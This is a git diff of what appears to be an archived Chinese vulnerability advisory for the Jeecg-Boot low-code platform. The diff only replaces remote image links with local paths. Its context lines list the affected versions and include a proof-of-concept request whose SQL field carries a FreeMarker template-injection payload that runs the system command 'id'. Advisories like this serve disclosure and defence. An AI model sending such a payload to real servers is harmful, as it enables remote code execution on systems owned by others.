@@ -59,7 +59,7 @@ schema_version: "1"
 影响版本  
   
 Jeecg-Boot版本3.0.0至3.5.3或者Jeecg-Boot版本2.4.x至2.4.6  
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKx3SXvWkwxfmsia0nRsyQ3u7tXAgE9T6Ass23YqH3VOIbYg0cuibI1niathvVa4KrVVALzHuo2oPzOw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/833b7ef5f0b7dd8f4047c32647c552a079f85d4c2618a89b8b36a3058b313029.png "")  
   
   
 03  
@@ -84,7 +84,7 @@ Jeecg-Boot是一款企业级低代码开发平台，集成了AI应用功能，�
 ```  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKx3SXvWkwxfmsia0nRsyQ3utbxzIs6Rx2Fn8akWkAicNZsa6VoBOFPqrHh0apuyyBNusnCfk8eLxRg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/1b502ed0e3bf9b994a13c07bed562c52b920d4399e15ca90257826a71cd86566.png "")  
   
   
   
@@ -121,7 +121,7 @@ Content-Length: 94
 {"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }' "}
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKx3SXvWkwxfmsia0nRsyQ3uia1zzb12CwAnqSs27BfNEyPS2ZxXhlzbqmsHrFdteiaXSiaZ2SyoniaFlg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/acf8f38e6210a0ab0d4681d50746f299a749429de54ffa38d352d8c20a49d83d.png "")  
   
   
 06  
